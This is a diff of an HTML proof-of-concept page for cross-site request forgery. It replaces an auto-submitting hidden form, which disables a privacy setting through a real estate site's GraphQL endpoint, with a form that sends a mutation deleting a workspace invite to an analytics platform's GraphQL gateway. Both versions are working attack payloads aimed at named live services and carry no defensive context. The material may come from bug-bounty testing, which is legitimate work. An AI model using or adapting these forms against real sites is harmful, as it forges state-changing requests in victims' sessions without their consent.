@@ -1,35 +1,20 @@
 <!doctype html>
-<html lang="en">
+<html>
 <head>
   <meta charset="utf-8">
-  <title>Pure CSRF PoC (Form)</title>
+  <title>CSRF PoC – RemoveWorkspaceInvite</title>
 </head>
-<body onload="document.getElementById('csrfForm').submit();">
-  <h3>Pure CSRF PoC — auto-submit form</h3>
+<body>
+  <h2>CSRF PoC – Remove Workspace Invite</h2>
 
-  <iframe name="hidden_iframe" style="display:none;"></iframe>
-
-  <form id="csrfForm"
-        action="https://mexa.realestate.com.au/graphql"
-        method="POST"
-        target="hidden_iframe"
-        enctype="application/x-www-form-urlencoded">
-
-    <input type="hidden" name="operationName" value="DisablePrivacySettingQuery">
-
-    <input type="hidden" name="query"
-      value='mutation DisablePrivacySettingQuery($groupId: PrivacyGroupId!) {
-        disablePrivacySetting(groupId: $groupId) {
-          groupId
-          enabled
-          __typename
-        }
-      }'>
-
-    <input type="hidden" name="variables"
-      value='{"groupId":"SUGGESTED_PROPERTIES"}'>
-
-    <noscript><input type="submit" value="Submit manually"></noscript>
+  <form action="https://app.segment.com/gateway-api/graphql?operation=RemoveWorkspaceInvite"
+        method="POST" target="_blank">
+    <textarea name="payload" style="width:100%;height:120px;">
+operationName=RemoveWorkspaceInvite&variables={"input":{"workspaceSlug":"admin-test-1a07","email":"admin@segment.com"}}&query=mutation RemoveWorkspaceInvite($input: DeleteInviteInput!) { deleteInvite(input: $input) { deleted __typename } }
+    </textarea>
+    <br>
+    <button type="submit">Submit CSRF Request</button>
   </form>
+
 </body>
 </html>
